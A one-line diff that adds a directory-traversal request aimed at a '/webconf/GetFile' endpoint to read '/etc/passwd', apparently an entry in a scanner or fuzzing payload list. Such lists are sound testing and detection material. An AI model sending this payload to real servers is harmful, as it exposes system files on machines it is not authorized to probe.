@@ -1,0 +1,1 @@
+/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
